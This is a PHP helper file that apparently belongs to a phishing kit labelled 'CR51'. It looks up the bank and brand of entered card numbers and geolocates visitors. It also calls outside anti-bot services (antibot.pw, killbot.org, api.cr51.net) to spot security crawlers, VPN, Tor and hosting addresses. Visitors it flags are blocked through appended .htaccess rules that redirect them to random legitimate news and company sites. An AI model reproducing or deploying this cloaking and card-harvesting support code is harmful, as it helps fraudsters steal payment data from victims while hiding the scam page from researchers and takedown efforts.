<?php
function _time()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $time = $date->format('H:i A');

    return $time;
}

function _date()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $fullday = $date->format('H:i A - D, d M Y');

    return $fullday;
}

function write($filename, $mode, $data)
{
    $fp = @fopen($filename, $mode);
    @fwrite($fp, $data);
    @fclose($fp);
}

function look_bin($num)
{
    error_reporting(0);
    $num    = str_replace(' ', '', trim($num));
    $num    = substr($num, 0, 6);
    $result  = @json_decode(curl("https://lookup.binlist.net/" . $num, false, true), true);
    $brand   = ($result['scheme'] ? $result['scheme'] : "unknown brand");
    $type    = ($result['type'] ? $result['type'] : "unknown type");
    $level   = ($result['brand'] ? $result['brand'] : "unknown level");
    $bank    = ($result['bank']['name'] ? $result['bank']['name'] : "unknown bank");
    $data    = strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $bank);

    return $data;
}

function curl($url, $hasHeader = false, $hasBody = true, $useragent = NULL, $time = NULL)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");

    curl_setopt($ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
    curl_setopt($ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0);


    if (!is_null($time))
        curl_setopt($ch, CURLOPT_TIMEOUT, $time);
    if (!is_null($time))
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}

function write_php_ini($array, $file)
{
    $res = array();
    foreach ($array as $key => $val) {

        if (is_array($val)) {
            $res[] = "[$key]";
            foreach ($val as $skey => $sval) $res[] = "$skey = " . (is_numeric($sval) ? $sval : '"' . $sval . '"');
        } else $res[] = "$key = " . (is_numeric($val) ? $val : '"' . $val . '"');
    }

    safefilerewrite($file, implode("\r\n", $res));
}

function safefilerewrite($fileName, $dataToSave)
{

    if ($fp = fopen($fileName, 'w')) {
        $startTime = microtime(TRUE);

        do {
            $canWrite = flock($fp, LOCK_EX);
            if (!$canWrite) usleep(round(rand(0, 100) * 1000));
        } while ((!$canWrite) and ((microtime(TRUE) - $startTime) < 5));

        if ($canWrite) {
            fwrite($fp, $dataToSave);
            flock($fp, LOCK_UN);
        }

        fclose($fp);
    }
}

function _404($message)
{
    echo "
<!DOCTYPE html>
<html>
<head>
    <meta charset=\"utf-8\">
    <meta name=\"robots\" content=\"noindex, nofollow, noarchive, nosnippet, noodp, noydir\">
    <title>404</title>
</head>
<body>
<code>{$message}</code>
</body>
</html>
    ";
}

function view($view, $params = [])
{
    if (strncmp($view, '/', 1) !== 0) {
        $view = FCPATH . 'CR51/Views/' . $view . ".php";
    }

    if (is_file($view . '.php')) {
        $view .= '.php';
    }

    return renderFile($view, $params);
}

function renderFile($_file_, $_params_ = [])
{
    ob_start();
    ob_implicit_flush(false);
    extract($_params_, EXTR_OVERWRITE);
    require($_file_);

    return ob_get_clean();
}

function base_url()
{
    $base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
    $base_url .= "://" . @$_SERVER['HTTP_HOST'];
    $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);

    return $base_url;
}

function _geoGet($ip_address)
{
    $url               = "https://ipwho.is/" . $ip_address;
    $getGeo            = json_decode(curl($url, false, true), 1);

    return $getGeo;
}

function _blocks()
{
    return write(FCPATH . '.htaccess', 'a', "\r\nRewriteCond %{REMOTE_ADDR} ^" . $_SERVER['REMOTE_ADDR'] . "$\r\nRewriteRule .* " . uriRand() . " [R,L]\r\n");
}

function uriRand()
{
    $uri = [
        'https://tumblr.com',
        'https://skyrock.com',
        'https://boston.com',
        'https://huffpost.com',
        'https://nbcnews.com',
        'https://foxnews.com',
        'https://usatoday.com',
        'https://gvwire.com',
        'https://newsnow.co.uk',
        'https://latimes.com',
        'https://timesunion.com',
        'https://postimages.org',
        'https://bundestag.de',
        'https://vox.com',
        'https://deloitte.com',
        'https://aafp.org',
        'https://supersonicads.com',
        'https://movavi.com',
        'https://csdn.net',
        'https://imgflip.com',
        'https://ceskatelevize.cz',
        'https://spreadshirt.com',
        'https://gumtree.co.za',
        'https://macmillandictionary.com',
        'https://laughingsquid.com',
        'https://appleinsider.com',
        'https://qianzhan.com',
        'https://serif.com',
        'https://qatarairways.com',
        'https://suicidepreventionlifeline.org',
        'https://malavida.com',
        'https://fender.com',
        'https://feedspot.com',
        'https://realtor.com',
        'https://comixology.com',
        'https://defimedia.info',
        'https://dailythanthi.com',
        'https://thenewstribune.com',
        'https://marketwatch.com',
        'https://forbes.com',
        'https://mlive.com',
        'https://sacbee.com',
        'https://spokesman.com',
        'https://angelfire.com',
        'https://myheritage.com',
        'https://arynews.tv',
        'https://roozaneh.net',
        'https://teacherspayteachers.com',
        'https://amtrak.com',
        'https://ebaumsworld.com',
        'https://ssisurveys.com',
        'https://edition.cnn.com',
        'https://pcworld.com'
    ];

    shuffle($uri);
    return $uri[0];
}

function redirect($uri = '', $method = 'auto', $code = NULL)
{
    if (!preg_match('#^(\w+:)?//#i', $uri)) {
        $uri = base_url($uri);
    }

    if ($method === 'auto' && isset($_SERVER['SERVER_SOFTWARE']) && strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== FALSE) {
        $method = 'refresh';
    } elseif ($method !== 'refresh' && (empty($code) or !is_numeric($code))) {

        if (isset($_SERVER['SERVER_PROTOCOL'], $_SERVER['REQUEST_METHOD']) && $_SERVER['SERVER_PROTOCOL'] === 'HTTP/1.1') {
            $code = ($_SERVER['REQUEST_METHOD'] !== 'GET')
                ? 303
                : 307;
        } else {
            $code = 302;
        }
    }

    switch ($method) {

        case 'refresh':
            header('Refresh:0;url=' . $uri);
            break;

        default:
            header('Location: ' . $uri, TRUE, $code);
            break;
    }

    exit;
}

function _config($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/.settings.ini");
    return $get[$name];
}

function _antibot($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/antibot.ini");
    return $get[$name];
}

function _killbot($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/killbot.ini");
    return $get[$name];
}

function CR51INI($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/cr51blocker.ini");
    return $get[$name];
}

function _panel($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/setpanel.ini");
    return $get[$name];
}

function ccMasking($number)
{
    return substr($number, 0, 0) . substr($number, -4);
}

function antibot($ip, $useragent)
{
    $key = _config('ANTIBOT');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "");
    $data = curl_exec($ch);
    curl_close($ch);
    $check = json_decode($data, 1);

    if ($check['is_bot'] == true) {
        return true;
    } else {
        return false;
    }
}

function killbot($ip, $useragent)
{
    $key = _config('KILLBOT');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Killbot Blocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://killbot.org/api/v1/blocker?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "&url=" . urlencode($_SERVER['REQUEST_URI']));
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $meta = $json['meta']['code'];
    $blocked = $json['detect_by'] == 1 ? $json['data']['is_bot'] : $json['data']['block_access'];

    if ($meta = 200 && $blocked) {
        return true;
    } else {
        return false;
    }
}

function CR51BLOCKER($ip, $bots)
{
    $token = CR51INI('TOKEN');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.cr51.net/v1/blocker?token=" . $token . "&bots=" . $bots . "&ip=" . $ip . "");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $blok = $json['bots'];

    if ($blok == "detect") {
        return true;
    } else {
        return false;
    }
}

function CR51NETWORK($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.cr51.net/json?ip=" . $ip . "");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $anonymous = $json['anonymous'];
    $proxy = $json['proxy'];
    $vpn = $json['vpn'];
    $tor = $json['tor'];
    $hosting = $json['hosting'];

    if ($anonymous == "detect" || $proxy == "detect" || $vpn == "detect" || $tor == "detect" || $hosting == "detect") {
        return true;
    } else {
        return false;
    }
}

function blackbox($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://blackbox.ipinfo.app/lookup/" . $ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $resp = curl_exec($ch);
    curl_close($ch);
    $result = $resp;

    if ($result == "Y") {
        return true;
    } else {
        return false;
    }
}
